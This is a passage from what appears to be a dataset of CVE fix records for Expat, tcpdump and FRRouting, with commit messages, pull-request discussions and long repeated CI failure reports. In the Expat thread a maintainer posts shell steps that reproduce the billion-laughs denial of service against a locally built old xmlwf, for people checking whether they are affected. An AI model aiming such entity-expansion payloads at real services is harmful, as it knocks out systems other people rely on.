threshold ignored\")\r\n> +                   T(\", xmlwf has been compiled without DTD/GE support.\\n\"));\r\n>  #endif\r\n> ```\r\n> \r\n> The remove portion of this code is not present in 2.2.9.\r\n\r\nThe picture is this:\r\n- Expat was long vulnerable to billion laughs attacks and release 2.4.0 fixed it for compilation with XML_DTD enabled but not for XML_DTD disabled\r\n- Expat 2.6.0 now fixes the vulnerability for XML_DTD disabled also. That case is not super common, so depending on your environment you may be lucky and that case does not even matter to your environment. E.g. most if not all Linux distros have XML_DTD enabled.\r\n Why not combine all the commits in pr into one commit? This is a great benefit to the functioning of the community? Or you can do like the cpython community, which merges multiple commits in pr into one. Is there any easy way to reproduce it? > please open a dedicated ticket for questions like that, next time \ud83d\ude4f\r\n\r\nSure, thanks for the info. Appreciate it. Have a nice time ahead. > Why not combine all the commits in pr into one commit?\r\n\r\n@zhuofeng6 I believe that would be\u2026\r\n- a) https://github.com/libexpat/libexpat/pull/777.diff\r\n- b)  `git diff daa89e42^ 8a6c61de`\r\n\r\n> This is a great benefit to the functioning of the community? Or you can do like the cpython community, which merges multiple commits in pr into one.\r\n\r\nThat's not a good idea and I wish CPython would not do that, but I will not go into details here because too far off-topic.\r\n\r\n> Is there any easy way to reproduce it?\r\n\r\nYes, compile Expat <2.6.0 without DTD support, feed the example from https://en.wikipedia.org/wiki/Billion_laughs_attack#Code_example to e.g. Expat's own xmlwf, and see it take minutes, e.g.:\r\n\r\n```bash\r\ncd \"$(mktemp -d)\"\r\ngit clone --depth 1 --branch R_2_5_0 https://github.com/libexpat/libexpat/\r\ncd libexpat/expat/\r\ncmake -S . -B build -DEXPAT_DTD=OFF && make -C build\r\nwget -O- https://en.wikipedia.org/wiki/Billion_laughs_attack | html2text | sed -n '95,109p' | tee billion.xml\r\ntime ./build/xmlwf/xmlwf < billion.xml  # takes minutes but should not\r\n```\r\n\r\nThe extraction of `billion.xml` is a brittle quickhack and may break after my post (..). html2text used in there is https://github.com/grobian/html2text in version 2.2.3.\r\n Compiling with `configure` seems to be unaffected. right?\r\n```\r\n./configure\r\nmake\r\n```\r\nresult:\r\n```\r\n# time ./xmlwf/xmlwf < billion.xml\r\nSTDIN:15:6: limit on input amplification factor (from DTD and entities) breached\r\n\r\nreal\t0m0.646s\r\nuser\t0m0.632s\r\nsys\t0m0.012s\r\n``` The description of cve is that `XML_DTD` is not defined, but in the example you gave, it is `EXPAT_DTD`. You are renaming CMakeLists.txt in this file.\r\n\r\n```c\r\n_expat_copy_bool_int(EXPAT_DTD XML_DTD)\r\n```\r\n\r\nBut there doesn't seem to be a rename through configure. > Compiling with `configure` seems to be unaffected. right?\r\n> \r\n> ```\r\n> ./configure\r\n> make\r\n> ```\r\n> \r\n> result:\r\n> \r\n> ```\r\n> # time ./xmlwf/xmlwf < billion.xml\r\n> STDIN:15:6: limit on input amplification factor (from DTD and entities) breached\r\n> \r\n> real\t0m0.646s\r\n> user\t0m0.632s\r\n> sys\t0m0.012s\r\n> ```\r\n\r\n@zhuofeng6 it *is* affected, but this always-on code in `configure.ac`\u2026\r\n\r\nhttps://github.com/libexpat/libexpat/blob/654d2de0da85662fcc7644a7acd7c2dd2cfb21f0/expat/configure.ac#L298-L299\r\n\r\n\u2026 makes it less accessible by default. It depends on what your layer of integration does, it would be easy to disable if wanted.\r\n\r\n> The description of cve is that `XML_DTD` is not defined, but in the example you gave, it is `EXPAT_DTD`. You are renaming CMakeLists.txt in this file.\r\n> \r\n> ```c\r\n> _expat_copy_bool_int(EXPAT_DTD XML_DTD)\r\n> ```\r\n> \r\n> But there doesn't seem to be a rename through configure.\r\n\r\n`XML_DTD` is primilary a C preprocessor macro, while `EXPAT_DTD` only exists in the CMake build system. The key question is whether when compiling macro `XML_DTD` is defined. Most integrations control that via file `expat_config.h`. Hi, will CVE-2023-52426 be fixed in 2.3.0? @hartwork  > Hi, will [CVE-2023-52426](https://github.com/advisories/GHSA-mp2w-hjcj-f5g9) be fixed in 2.3.0? @hartwork\r\n\r\n@lixiaoshuai666 if you're asking for a backport to 2.3.0, there are no plans for that, no. I would always advise for upgrading to 2.6.1 and soon 2.6.2, ETA for the release is tomorrow 2024-03-13 UTC+1 evening, includes more security work. @lixiaoshuai666 2.6.2 is out by now",
            "pr_title_words": 8,
            "comments_words": 868,
            "total_other_info_words": 876
        },
        {
            "cve-id": "CVE-2023-1801",
            "commit_url": "https://github.com/the-tcpdump-group/tcpdump/commit/7578e1c04ee280dda50c4c2813e7d55f539c6501",
            "commit_msg": "Have a common routine for converting dates and times to strings.\n\nHave a routine that takes a buffer, a strftime format, and a struct tm *\nas arguments, and:\n\n* checks whether the struct tm * is null and, if so, returns a string\nindicating that the date and time couldn't be converted;\n\n* otherwise, passes it to strftime(), along with the buffer and the\nformat argument and, if strftime() returns 0, meaning the string didn't\nfit into the buffer and thus that the buffer's contents are undefined,\nreturns a string indicating that the date and time didn't fit into the\nbuffer;\n\n* otherwise, returns a pointer to the buffer.\n\nCall that routine instead of directly calling strftime() in printers;\nthat prevents printing a buffer with undefined data if the buffer isn't\nbig enough for the string.\n\nAlso, when generating file names using an strftime format, check the\nreturn value of strftime() to make sure the buffer didn't overflow.",
            "commit_msg_words": 159,
            "other_info": "Have a common routine for converting dates and times to strings. (The failure on netbsd-mips64 was due to a compiler segfault, rebuilding now.) Also the commit message has two typos (\"::\" and \"inticating\"). > Also the commit message has two typos (\"::\" and \"inticating\").\r\n\r\nFixed. Getting a pull request merged in this project can be remarkably difficult. > Getting a pull request merged in this project can be remarkably difficult.\r\n\r\n\"Difficult\" as in \"a lot of people point out problems with the code\", or \"difficult\" as in \"the mechanisms provided by Git and GitHub make it overly complicated\"? The former is arguably a feature; the latter is helped, on my side, with some scripts wherein, after I've set up my forked repository, I can do:\r\n\r\n- `git reviewbranch <branch name>` to create a branch for the changes;\r\n- `git doreview` after committing those changes or committing updates with `git commit --amend`;\r\n- `git reviewdone` when the change has been committed to the main repository.\r\n\r\nThey were originally developed when Wireshark moved to GitLab, but it turned out the basic commands they do work the same with GitHub. That was my attempt of a philosophical remark about software criticism. These changes certainly deserve another review round after a good sleep. Message on  CI netbsd-mips64 host:\r\n```\r\n/home/buildbot-worker/netbsd-mips64/tmpfs/tcpdump-netbsd-mips64/build/print-radius.c: In function \u2018print_attr_string\u2019:\r\n/home/buildbot-worker/netbsd-mips64/tmpfs/tcpdump-netbsd-mips64/build/print-radius.c:831:7: internal compiler error: Segmentation fault\r\n  831 |       nd_print_trunc(ndo);\r\n      |       ^~~~~~~~~~~~~~\r\nno stack trace because unwind library not available\r\nPlease submit a full bug report,\r\nwith preprocessed source if appropriate.\r\nSee <http://www.NetBSD.org/support/send-pr.html> for instructions.\r\n*** [CMakeFiles/netdissect.dir/print-radius.c.o] Error code 1\r\n``` (Rebased on master.) GCC segfaults on that host from time to time, I have restarted that build. I do not have a better solution for this problem now. \"no stack trace because unwind library not available\"\r\nPerhaps the installation of this library could give some indication. If there is anything else that prevents these changes from going into the master branch, I cannot see it. (Rebased on master.) Fix patch line 211: space before tab in indent. It seems good. Thanks to everyone. Thank you! This should probably be backported to 4.99. > This should probably be backported to 4.99.\r\n\r\nAgreed.",
            "pr_title_words": 11,
            "comments_words": 349,
            "total_other_info_words": 360
        },
        {
            "cve-id": "CVE-2023-31490",
            "commit_url": "https://github.com/FRRouting/frr/commit/06431bfa7570f169637ebb5898f0b0cc3b010802",
            "commit_msg": "bgpd: Ensure stream received has enough data\n\nBGP_PREFIX_SID_SRV6_L3_SERVICE attributes must not\nfully trust the length value specified in the nlri.\nAlways ensure that the amount of data we need to read\ncan be fullfilled.\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donald Sharp <sharpd@nvidia.com>",
            "commit_msg_words": 42,
            "other_info": "bgpd: Ensure stream received has enough data <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-8716/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Failed\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6U18AMD64-8716/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8716/artifact/TOPO6U18AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 5: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 5: No useful log found\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6U18I386-8716/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8716/artifact/TOPO6U18I386/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5U18AMD64-8716/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8716/artifact/TOPO5U18AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6DEB10AMD64-8716/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8716/artifact/TOPO6DEB10AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 6: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 6: No useful log found\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5DEB10AMD64-8716/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8716/artifact/TOPO5DEB10AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5U18I386-8716/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8716/artifact/TOPO5U18I386/ErrorLog/log_topotests.txt\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Ubuntu 20.04 deb pkg check\n- Ubuntu 18.04 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 9\n- Debian 10 deb pkg check\n- Debian 9 deb pkg check\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- Topotests Ubuntu 18.04 amd64 part 1\n- Topotests Ubuntu 18.04 i386 part 3\n- Topotests Ubuntu 18.04 i386 part 8\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 amd64 part 9\n- Addresssanitizer topotests part 4\n- Addresssanitizer topotests part 5\n- Topotests Ubuntu 18.04 arm8 part 3\n- Topotests debian 10 amd64 part 1\n- Topotests debian 10 amd64 part 4\n- Topotests debian 10 amd64 part 2\n- Topotests Ubuntu 18.04 i386 part 9\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 amd64 part 8\n- Topotests debian 10 amd64 part 3\n- Addresssanitizer topotests part 0\n- Static analyzer (clang)\n- Addresssanitizer topotests part 2\n- Ubuntu 16.04 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 4\n- Topotests Ubuntu 18.04 i386 part 1\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests Ubuntu 18.04 arm8 part 2\n- Addresssanitizer topotests part 3\n- Topotests Ubuntu 18.04 amd64 part 7\n- Topotests debian 10 amd64 part 0\n- Topotests Ubuntu 18.04 arm8 part 7\n- Topotests Ubuntu 18.04 arm8 part 8\n- Addresssanitizer topotests part 7\n- Topotests Ubuntu 18.04 i386 part 0\n- Topotests debian 10 amd64 part 9\n- Topotests Ubuntu 18.04 i386 part 7\n- Addresssanitizer topotests part 6\n- CentOS 7 rpm pkg check\n- Fedora 29 rpm pkg check\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 amd64 part 2\n- Topotests Ubuntu 18.04 amd64 part 3\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests debian 10 amd64 part 8\n- Topotests Ubuntu 18.04 arm8 part 4\n</details>\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6U18AMD64-8716/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8716/artifact/TOPO6U18AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 5: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 5: No useful log found\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6U18I386-8716/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8716/artifact/TOPO6U18I386/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5U18AMD64-8716/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8716/artifact/TOPO5U18AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6DEB10AMD64-8716/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8716/artifact/TOPO6DEB10AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 6: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 6: No useful log found\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5DEB10AMD64-8716/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8716/artifact/TOPO5DEB10AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5U18I386-8716/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8716/artifact/TOPO5U18I386/ErrorLog/log_topotests.txt\n</details>\n\n    Report for bgp_attr.c | 2 issues\n    ===============================================\n    < ERROR: else should follow close brace '}'\n    < #2910: FILE: /tmp/f1-128948/bgp_attr.c:2910:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-8720/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Failed\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6U18AMD64-8720/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8720/artifact/TOPO6U18AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 5: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 5: No useful log found\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5U18AMD64-8720/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8720/artifact/TOPO5U18AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5DEB10AMD64-8720/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8720/artifact/TOPO5DEB10AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6U18I386-8720/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8720/artifact/TOPO6U18I386/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 6: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 6: No useful log found\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6DEB10AMD64-8720/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8720/artifact/TOPO6DEB10AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5U18I386-8720/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8720/artifact/TOPO5U18I386/ErrorLog/log_topotests.txt\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Debian 9 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 1\n- Ubuntu 20.04 deb pkg check\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- Ubuntu 18.04 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 8\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 i386 part 8\n- Topotests Ubuntu 18.04 amd64 part 9\n- Topotests Ubuntu 18.04 i386 part 3\n- Addresssanitizer topotests part 8\n- Debian 10 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 3\n- Addresssanitizer topotests part 4\n- Addresssanitizer topotests part 5\n- Topotests debian 10 amd64 part 1\n- Topotests debian 10 amd64 part 4\n- Topotests debian 10 amd64 part 2\n- Topotests Ubuntu 18.04 i386 part 9\n- Addresssanitizer topotests part 0\n- Topotests debian 10 amd64 part 3\n- Static analyzer (clang)\n- Topotests debian 10 amd64 part 0\n- Ubuntu 16.04 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 2\n- Topotests Ubuntu 18.04 i386 part 1\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 amd64 part 4\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests Ubuntu 18.04 arm8 part 7\n- Topotests Ubuntu 18.04 arm8 part 8\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests Ubuntu 18.04 i386 part 7\n- Addresssanitizer topotests part 7\n- Topotests Ubuntu 18.04 amd64 part 7\n- Addresssanitizer topotests part 6\n- Addresssanitizer topotests part 3\n- Topotests Ubuntu 18.04 i386 part 0\n- Topotests debian 10 amd64 part 9\n- Topotests Ubuntu 18.04 amd64 part 2\n- CentOS 7 rpm pkg check\n- Fedora 29 rpm pkg check\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 amd64 part 3\n- Topotests debian 10 amd64 part 8\n- Topotests Ubuntu 18.04 arm8 part 4\n- Addresssanitizer topotests part 2\n- Topotests Ubuntu 18.04 arm8 part 9\n</details>\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6U18AMD64-8720/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8720/artifact/TOPO6U18AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 5: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 5: No useful log found\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5U18AMD64-8720/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8720/artifact/TOPO5U18AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5DEB10AMD64-8720/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8720/artifact/TOPO5DEB10AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6U18I386-8720/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8720/artifact/TOPO6U18I386/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 6: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 6: No useful log found\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6DEB10AMD64-8720/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8720/artifact/TOPO6DEB10AMD64/ErrorLog/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5U18I386-8720/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-8720/artifact/TOPO5U18I386/ErrorLog/log_topotests.txt\n</details>\n\n    Report for bgp_attr.c | 2 issues\n    ===============================================\n    < ERROR: else should follow close brace '}'\n    < #2910: FILE: /tmp/f1-757987/bgp_attr.c:2910:\n\n</details>\n\n</details> rerunning to see if we can clean this up ...\r\nci:rerun <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Failed\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 6: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 6: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO6U18ARM8/TopotestDetails/\nTopotests Ubuntu 18.04 arm8 part 6: No useful log found\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6DEB10AMD64-9275/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO6DEB10AMD64/TopotestLogs/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5U18I386-9275/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5U18I386/TopotestLogs/log_topotests.txt\nTopotests Ubuntu 18.04 i386 part 5: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5U18I386/TopotestDetails/\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5DEB10AMD64-9275/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5DEB10AMD64/TopotestLogs/log_topotests.txt\nTopotests debian 10 amd64 part 5: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5DEB10AMD64/TopotestDetails/\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6U18AMD64-9275/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO6U18AMD64/TopotestLogs/log_topotests.txt\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 9: Failed (click for details)</summary>\nTopotests debian 10 amd64 part 9: Unknown Log <TopotestLogs>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO9DEB10AMD64/TopotestLogs/\nTopotests debian 10 amd64 part 9: No useful log found\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6U18I386-9275/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO6U18I386/TopotestLogs/log_topotests.txt\nTopotests Ubuntu 18.04 i386 part 6: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO6U18I386/TopotestDetails/\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5U18AMD64-9275/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5U18AMD64/TopotestLogs/log_topotests.txt\nTopotests Ubuntu 18.04 amd64 part 5: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5U18AMD64/TopotestDetails/\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 5: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 5: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5U18ARM8/TopotestDetails/\nTopotests Ubuntu 18.04 arm8 part 5: No useful log found\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests Ubuntu 18.04 amd64 part 7\n- Topotests Ubuntu 